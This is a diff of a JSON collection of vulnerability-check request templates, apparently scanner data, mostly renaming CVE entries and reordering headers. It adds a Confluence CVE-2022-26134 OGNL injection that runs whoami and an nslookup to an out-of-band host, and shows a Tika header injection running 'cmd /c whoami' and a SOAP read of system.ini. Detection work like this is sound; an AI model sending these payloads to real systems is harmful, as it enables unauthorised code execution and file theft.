@@ -6360,11 +6360,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -8049,7 +8049,7 @@
     {
       "id": "CVE-2019-12583",
       "info": {
-        "name": "Zyxel ZyWall UAG/USG - Missing ACL Guest Account Generator",
+        "name": "Zyxel ZyWall UAG/USG - Account Creation Access",
         "severity": "critical"
       },
       "requests": [
@@ -11159,9 +11159,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -15275,7 +15275,7 @@
     {
       "id": "CVE-2021-33044",
       "info": {
-        "name": "Dahua IPC/VTH/VTO devices Authentication Bypass",
+        "name": "Dahua IPC/VTH/VTO - Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -17812,7 +17812,7 @@
     {
       "id": "CVE-2022-22972",
       "info": {
-        "name": "Vmware Access,vIDM,vRA - Authentication Bypass",
+        "name": "VMware Workspace ONE Access/Identity Manager/vRealize Automation - Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -18107,6 +18107,22 @@
       ]
     },
     {
+      "id": "CVE-2022-26134",
+      "info": {
+        "name": "Confluence - Remote Code Execution via OGNL template injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/",
+            "{{BaseURL}}/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20{{interactsh-url}}%22%29%7D/"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-26148",
       "info": {
         "name": "Grafana & Zabbix Integration - Credential Disclosure",
@@ -18230,7 +18246,7 @@
     {
       "id": "CVE-2022-29303",
       "info": {
-        "name": "SolarView Compact 6.0 - OS Command Injection",
+        "name": "SolarView Compact 6.00 - OS Command Injection",
         "severity": "critical"
       },
       "requests": [
